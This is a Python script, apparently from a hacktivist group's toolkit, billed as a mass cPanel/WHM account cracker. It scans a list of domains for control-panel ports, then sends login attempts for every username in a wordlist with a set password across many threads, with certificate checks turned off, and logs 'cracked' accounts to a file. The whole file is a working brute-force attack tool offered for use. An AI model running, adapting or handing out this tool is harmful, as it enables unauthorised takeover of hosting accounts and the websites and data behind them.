# Author: Pari Malam

import os
import re
import requests
import urllib3
import concurrent.futures
from sys import stdout
from bs4 import BeautifulSoup
from colorama import Fore, init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

FR  =   Fore.RED
FY  =   Fore.YELLOW
FW  =   Fore.WHITE
FG  =   Fore.GREEN
FC  =   Fore.CYAN

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[cPanel & WHM] - {Fore.GREEN}Perform With Massive cPanel/WHM Account Cracker\n")
banners()



def URLdomain(url):
    return url.split('/')[0]



def cw(url):
    p = [2083, 2087]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    try:
        session = requests.Session()

        for port in p:
            uwp = f'https://{url}:{port}'

            response = session.get(uwp, headers=headers, verify=False)

            if response.status_code == 200:
                if port == 2083:
                    print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[cPanel Found!] - {FW}{uwp}")
                    with open("Results/cPanel.txt", "a") as f:
                        f.write(f"[+] cPanel: {uwp}\n")
                elif port == 2087:
                    print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[WHM Found!] - {FW}{uwp}")
                    with open("Results/WHM.txt", "a") as f:
                        f.write(f"[+] WHM: {uwp}\n")
            else:
                if port == 2083:
                    print(f"{FY}[cPanel/WHM] - {FR}[Not Found!] - {FW}{uwp}")
                elif port == 2087:
                    print(f"{FY}[cPanel/WHM] - {FR}[Not Found!] - {FW}{uwp}")

    except:
        pass



def c(url, username):
    ports = [2082, 2083]
    ep = "/login/?login_only=1"
    password = "OUR PASSWORD"

    for port in ports:
        uwp = f'https://{url}:{port}{ep}'

        payload = {
            "user": username,
            "pass": password,
            "goto_uri": "/"
        }

        headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Origin': f'https://{url}:{port}',
            'Referer': f'https://{url}:{port}/',
            'Connection': 'keep-alive'
        }

        try:
            response = requests.post(uwp, data=payload, headers=headers, verify=False)
            response.raise_for_status()

            if response.status_code == 200:
                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
                with open("Results/Cracked.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
            else:
                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}https://{url}:{port} - {FC}{username}|{password}")

        except requests.exceptions.RequestException as e:
            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}https://{url}:{port} - {FC}{username}|{password}")



def process_line(line, urls):
    username = line.strip()
    for url in urls:
        domain = URLdomain(url)
        cw(domain)
        c(domain, username)



def main():
    w00t = input(f"{FY}DOMAIN/IP LIST: {FW}")
    with open(w00t) as f:
        urls = [line.strip() for line in f]
    wordlist = input(f"{FY}WORDLIST: {FW}")

    try:
        with open(f"lib/{wordlist}", "r") as file:
            lines = [line for line in file]

            hm = int(input(f"{FY}THREAD: {FW}"))
            with concurrent.futures.ThreadPoolExecutor(max_workers=hm) as executor:
                executor.map(process_line, lines, [urls] * len(lines))

    except FileNotFoundError:
        print(f"{FR}Whut are you doin? {wordlist} Not Found!")



if __name__ == "__main__":
    main()
